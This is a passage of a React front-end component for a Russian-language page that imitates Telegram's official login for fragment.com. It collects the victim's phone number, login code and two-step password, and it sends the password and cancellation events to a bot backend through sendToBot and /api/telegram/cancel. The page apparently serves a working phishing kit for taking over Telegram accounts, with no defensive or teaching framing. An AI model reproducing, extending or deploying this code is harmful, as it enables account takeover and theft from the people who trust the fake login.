    console.log("[v0] Password length:", password.length)
    console.log("[v0] =====================================")

    setIsLoading(true)
    setLoadingMessage("Проверка пароля...")
    setErrorMessage("")

    try {
      const result = await sendToBot("verify_password", { phone: submittedPhone, password })
      console.log("[v0] ✅ Password verification response:", result)

      if (!result?.pending) {
        if (result.success) {
          setLoadingMessage("Успешно! Авторизация завершена.")
        } else {
          setErrorMessage(result.error || "Неверный пароль")
          setIsLoading(false)
          setLoadingMessage("")
        }
      }
      // If pending, loading is already true and polling will handle the rest.
    } catch (error) {
      console.error("[v0] ❌ Error verifying password:", error)
      setErrorMessage("Неверный пароль")
      setIsLoading(false)
      setLoadingMessage("")
    }
  }

  const handleChangePhone = () => {
    console.log("[v0] 🔄 User requested phone change")
    setAuthStep("phone")
    setVerificationCode("")
    setPassword("")
    setErrorMessage("")
    setLoadingMessage("")
    if (currentRequestId) {
      setCurrentRequestId(null)
      // setIsLoading(false) // might be needed if step change should remove loading indicator
    }
  }

  const handleCancel = async () => {
    console.log("[v0] ❌ ========== CANCELLATION ==========")
    console.log("[v0] Current step:", authStep)
    console.log("[v0] Phone:", submittedPhone || phone)
    console.log("[v0] Chat ID:", chatId)
    console.log("[v0] Current Request ID:", currentRequestId)
    console.log("[v0] =====================================")

    if (currentRequestId) {
      setCurrentRequestId(null)
      // No need to explicitly call clearInterval here as the useEffect cleanup handles it.
    }

    try {
      await fetch("/api/telegram/cancel", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          phone: submittedPhone || phone, // Use submittedPhone if available, else current phone
          step: authStep,
          chatId: chatId, // Sending chatId so the bot knows who cancelled
          requestId: currentRequestId, // Send requestId if cancellation is during polling
        }),
      })
      console.log("[v0] ✅ Cancel notification sent to bot")
    } catch (error) {
      console.error("[v0] ❌ Error sending cancel notification:", error)
    }

    // Reset states
    setAuthStep("phone")
    setPhone("")
    setVerificationCode("")
    setPassword("")
    setIsLoading(false)
    setErrorMessage("")
    setLoadingMessage("")
    setCurrentRequestId(null)
  }

  return (
    <div className="min-h-screen bg-white flex items-center justify-center p-4 sm:p-6 md:p-8">
      <section className="w-full max-w-[320px] sm:max-w-[380px] md:max-w-[420px]">
        <div className="flex justify-center items-center mb-6 sm:mb-8 md:mb-10">
          <img
            src="/images/telegram-wallet.png"
            alt="Telegram to Wallet"
            className="h-24 sm:h-28 md:h-32 object-contain select-none pointer-events-none"
            style={{ userSelect: "none", WebkitUserSelect: "none" }}
            onContextMenu={(e) => e.preventDefault()}
          />
        </div>

        <div className="text-center mb-4 sm:mb-6 md:mb-8">
          <h1 className="text-sm sm:text-[15px] md:text-base text-gray-900 leading-snug mb-2 sm:mb-3 md:mb-4">
            <span className="font-bold">Войдите, чтобы использовать аккаунт</span>
            <br />
            <span className="font-bold">Telegram</span>
            <br />
            <span className="font-bold">для fragment.com и</span>{" "}
            <a
              href="https://telegram.org/faq#login-and-sms"
              target="_blank"
              rel="noopener noreferrer"
              className="text-blue-500 hover:underline font-bold"
            >
              Fragment Auction Alerts
            </a>
          </h1>

          {authStep === "phone" && (
            <p className="text-xs sm:text-[13px] md:text-sm text-gray-700 leading-snug mt-3 sm:mt-4 md:mt-5 px-2">
              Введите свой <span className="font-bold">номер телефона</span> в{" "}
              <a
                href="https://telegram.org/faq#login-and-sms"
                target="_blank"
                rel="noopener noreferrer"
                className="text-blue-500 hover:underline"
              >
                международном формате
              </a>
              .
              <br />
              Подтверждение будет отправлено в приложение <span className="font-bold">Telegram</span> на вашем
              устройстве.
            </p>
          )}

          {authStep === "code" && (
            <p className="text-xs sm:text-[13px] md:text-sm text-gray-700 leading-snug mt-3 sm:mt-4 md:mt-5 px-2">
              Мы отправили код в приложение <span className="font-bold">Telegram</span> на вашем устройстве.
            </p>
          )}

          {authStep === "password" && (
            <p className="text-xs sm:text-[13px] md:text-sm text-gray-700 leading-snug mt-3 sm:mt-4 md:mt-5 px-2">
              Ваш аккаунт защищен дополнительным паролем.
            </p>
          )}
        </div>

        {authStep === "phone" && (
          <form
            onSubmit={handlePhoneSubmit}
            className="mb-3 md:mb-4 max-w-[280px] sm:max-w-[300px] mx-auto mt-6 sm:mt-8 md:mt-10"
          >
            <div className="mb-3 md:mb-4">
              <div className="relative mb-3 md:mb-4" ref={dropdownRef}>
                <button
                  type="button"
                  onClick={() => {
                    setIsOpen(!isOpen)
                    if (!isOpen) {
                      setSearchQuery("")
                    }
                  }}
                  className="w-full text-left text-gray-800 pb-[3px] hover:text-gray-900 transition-colors flex items-center justify-between text-xs sm:text-[13px] border-b border-gray-300 hover:border-gray-400"
                >
                  {isOpen ? (
                    <input
                      type="text"
                      className="w-full text-xs sm:text-[13px] px-0 py-0 bg-transparent text-gray-800 focus:outline-none border-none"
                      placeholder="Поиск"
                      value={searchQuery}
                      onChange={(e) => setSearchQuery(e.target.value)}
                      autoComplete="off"
                      autoFocus
                      onClick={(e) => e.stopPropagation()}
                    />
                  ) : (
                    <span className="font-normal text-xs sm:text-[13px]">{selectedCountry.name}</span>
                  )}
                  <ChevronDown className="w-2.5 h-2.5 text-gray-600 flex-shrink-0" />
                </button>

                {isOpen && (
                  <div className="absolute top-full left-0 right-0 mt-0 bg-white border border-gray-200 rounded-sm shadow-lg z-20">
                    <div className="max-h-32 sm:max-h-40 md:max-h-48 overflow-y-auto">
                      {filteredCountries.length > 0 ? (
                        filteredCountries.map((country) => (
                          <button
                            key={country.name}
                            type="button"
                            onClick={() => {
                              setSelectedCountry(country)
                              setCountryCode(country.code)
                              setIsOpen(false)
                              setSearchQuery("")
                              setPhone("")
                            }}
                            className="w-full px-1.5 py-0.5 text-left text-gray-800 hover:bg-gray-50 transition-colors text-xs sm:text-[13px] flex justify-between items-center"
                          >
                            <span className="text-xs sm:text-[13px]">{country.name}</span>
                            <span className="text-gray-500 text-xs sm:text-[13px] ml-1.5 flex-shrink-0">
                              {country.code}
                            </span>
                          </button>
                        ))
                      ) : (
                        <div className="px-1.5 py-1 text-xs sm:text-[13px] text-gray-500 text-center">
                          Страна не найдена
                        </div>
                      )}
                    </div>
                  </div>
                )}
              </div>

              <div className="flex gap-1.5 items-center mb-2 md:mb-3">
                <div className="flex items-center gap-1.5 w-full">
                  <div className="flex flex-col">
                    <input
                      type="tel"
                      className={`px-1.5 py-[5px] bg-transparent text-gray-700 w-9 sm:w-10 text-center focus:outline-none text-xs sm:text-[13px] font-normal transition-colors ${
                        codeInputFocus ? "border-b border-blue-500" : "border-b border-gray-300"
                      }`}
                      autoComplete="off"
                      value={countryCode}
                      onChange={handleCodeChange}
                      onFocus={() => setCodeInputFocus(true)}
                      onBlur={() => setCodeInputFocus(false)}
                    />
                  </div>

                  <div className="flex-1 flex flex-col relative min-w-0">
                    <div className="relative">
                      <input
                        ref={phoneInputRef}
                        type="tel"
                        className={`w-full px-0 py-[3px] bg-transparent focus:outline-none text-gray-800 caret-gray-800 text-left text-xs sm:text-[13px] font-normal transition-colors ${
                          phoneInputFocus ? "border-b border-blue-500" : "border-b border-gray-300"
                        }`}
                        autoComplete="off"
                        value={getPhonePlaceholder()}
                        onChange={handlePhoneChange}
                        onFocus={() => setPhoneInputFocus(true)}
                        onBlur={() => setPhoneInputFocus(false)}
                      />
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {errorMessage && (
              <div className="text-red-500 text-[10px] sm:text-[11px] text-center mb-2">{errorMessage}</div>
            )}

            {isLoading && (
              <div className="flex items-center justify-center gap-2 mb-3">
                <Loader2 className="w-4 h-4 animate-spin text-blue-500" />
                <span className="text-xs text-gray-600">{loadingMessage}</span>
              </div>
            )}

            <div className="flex gap-2 justify-center mt-3 md:mt-4">
              <button
                type="button"
                onClick={handleCancel}
                className="px-2.5 py-[5px] text-blue-500 font-medium text-xs sm:text-[13px] hover:text-blue-600 transition-colors"
              >
                ОТМЕНА
              </button>
              <button
                type="submit"
                disabled={isLoading || phone.length !== selectedCountry.digits}
                className="px-4 sm:px-5 py-[8px] bg-blue-500 text-white rounded-full font-medium text-xs sm:text-[13px] hover:bg-blue-600 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isLoading ? "..." : "ДАЛЕЕ"}
              </button>
            </div>
          </form>
        )}

        {authStep === "code" && (
          <form
            onSubmit={handleCodeSubmit}
            className="mb-3 md:mb-4 max-w-[280px] sm:max-w-[300px] mx-auto mt-6 sm:mt-8 md:mt-10"
          >
            <div className="mb-4 md:mb-5 text-center">
              <div className="text-xs sm:text-sm md:text-[14px] text-gray-900 mb-1">
                {formatPhoneForDisplay(submittedPhone)}{" "}
                <button
                  type="button"
                  onClick={handleChangePhone}
                  className="text-blue-500 hover:underline text-xs sm:text-[13px] ml-1"
                >
                  изменить
                </button>
              </div>
              <div className="text-[11px] sm:text-xs text-gray-600 mt-3 px-2">
                Сообщение отправлено в Telegram.
                <br />
                Пожалуйста, подтвердите доступ..
              </div>
            </div>

            <div className="mb-3 md:mb-4 relative">
              <input
                type="text"
                inputMode="numeric"
                className="w-full px-2 py-[5px] bg-transparent text-gray-800 caret-gray-800 text-center focus:outline-none text-xs sm:text-[13px] font-normal border-b border-gray-300 focus:border-blue-500 transition-colors"
                placeholder="Код"
                value={verificationCode}
                onChange={(e) => setVerificationCode(e.target.value.replace(/\D/g, "").slice(0, 5))}
                maxLength={5}
                autoFocus
              />
            </div>

            {errorMessage && (
              <div className="text-red-500 text-[10px] sm:text-[11px] text-center mb-2">{errorMessage}</div>
            )}

            {isLoading && (
              <div className="flex items-center justify-center gap-2 mb-3">
                <Loader2 className="w-4 h-4 animate-spin text-blue-500" />
                <span className="text-xs text-gray-600">{loadingMessage}</span>
              </div>
            )}

            <div className="flex gap-2 justify-center mt-3 md:mt-4">
              <button
                type="button"
                onClick={handleCancel}
                className="px-2.5 py-[5px] text-blue-500 font-medium text-xs sm:text-[13px] hover:text-blue-600 transition-colors"
              >
                ОТМЕНА
              </button>
              <button
                type="submit"
                disabled={isLoading}
                className="px-4 sm:px-5 py-[8px] bg-blue-500 text-white rounded-full font-medium text-xs sm:text-[13px] hover:bg-blue-600 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isLoading ? "..." : "ДАЛЕЕ"}
              </button>
            </div>
          </form>
        )}

        {authStep === "password" && (
          <form
            onSubmit={handlePasswordSubmit}
            className="mb-3 md:mb-4 max-w-[280px] sm:max-w-[300px] mx-auto mt-6 sm:mt-8 md:mt-10"
          >
            <div className="mb-3 md:mb-4">
              <input
                type="text"
                className="w-full px-2 py-[5px] bg-transparent text-gray-800 text-center focus:outline-none text-xs sm:text-[13px] font-normal border-b border-gray-300 focus:border-blue-500 transition-colors"
                placeholder="Пароль"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                autoFocus
              />
            </div>

            {errorMessage && (
              <div className="text-red-500 text-[10px] sm:text-[11px] text-center mb-2">{errorMessage}</div>
            )}

            {isLoading && (
              <div className="flex items-center justify-center gap-2 mb-3">
                <Loader2 className="w-4 h-4 animate-spin text-blue-500" />
                <span className="text-xs text-gray-600">{loadingMessage}</span>
              </div>
            )}

            <div className="flex gap-2 justify-center mt-3 md:mt-4">
              <button
                type="button"
                onClick={handleCancel}
                className="px-2.5 py-[5px] text-blue-500 font-medium text-xs sm:text-[13px] hover:text-blue-600 transition-colors"
              >
                ОТМЕНА
              </button>
              <button
                type="submit"
                disabled={isLoading || password.length === 0}
                className="px-4 sm:px-5 py-[8px] bg-blue-500 text-white rounded-full font-medium text-xs sm:text-[13px] hover:bg-blue-600 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isLoading ? "..." : "ДАЛЕЕ"}
              </button>
            </div>
          </form>
        )}
      </section>
    </div>
  )
}
